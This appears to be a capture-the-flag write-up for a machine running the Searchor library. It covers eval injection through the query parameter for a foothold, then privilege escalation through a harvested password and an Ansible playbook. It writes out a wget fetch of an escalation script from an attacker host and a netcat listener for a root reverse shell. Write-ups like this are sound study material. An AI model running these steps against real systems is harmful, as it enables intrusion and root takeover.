## Intial Foothold
**Abuse Searchor to execute commands**


### Resources
- [Searchor Repo](https://github.com/ArjunSharda/Searchor)
- [Python Eval Function](https://realpython.com/python-eval-function/#understanding-pythons-eval)
- [Bypass python sandbox](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)

### Exploit

```
python3 exploit.py
```
**Steps**
- When I went to website I found that it using Searchor.
- I downloaded Searchor on my local machine and play with it to find a way to execute commands.
- I assumed web application pass the query and engine parameters in POST request to Searchor directly.

  ``Engine.<engine>.search('<query>')``
- I tried to abuse engine parameter and there was no way to abuse it.
- Then I focused on query parameter and sent ' in it and it break the application so I was in the correct way.
  Normal Request:
  
  
  ![image](https://user-images.githubusercontent.com/59315492/230909846-0853fa7b-4b09-484c-9c39-0ba820f0883b.png)
  
  
  Response:
 
  ![image](https://user-images.githubusercontent.com/59315492/230909887-618f1b70-34c0-4b5f-a2b5-e7d6429a5f1b.png)
  
  
  Abused Request with ' :
  
  ![image](https://user-images.githubusercontent.com/59315492/230910048-4acc9c72-8621-4f3b-9092-895cc6dd7250.png)
  
  
  Response:
  
  ![image](https://user-images.githubusercontent.com/59315492/230910150-0326e94e-fe54-498a-9f9b-9319b44e5bd2.png)

- I tried to bypass Searchor on my local machine and I found a way to bypass it.
  
  ![image](https://user-images.githubusercontent.com/59315492/230912748-0bacadcb-d71a-4c10-a5ed-486798bccc35.png)

  ![image](https://user-images.githubusercontent.com/59315492/230912809-fa50c90a-bae6-4748-81ea-fd311472cfdf.png)


---
## Privilege Escalation:
**SU to phil user using his password located in /home/frank/.m2/settings.xml and use Ansible playbook to ecalate to root**

[Ansible Playbook Exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)

### Exploit

- Upload PrivEsc.py to target using wget and python Simple HTTP Server.
  - Run Simple HTTP Server on Attacker Machine.
    
    ```
    python3 http.server 8000
    ```
  - Download PriEsc.py on Target Machine.
    
    ```
    wget http://<Local_IP>:8000/PrivEsc.py
    ```
- Run netcat listener on Attacker Machine

    ```
    nc -nlvp 4444
    ```
- Run PrivEsc.py and wait for Root shell connection it may take a while.

    ```
    python3 PrivEsc.py
    ```
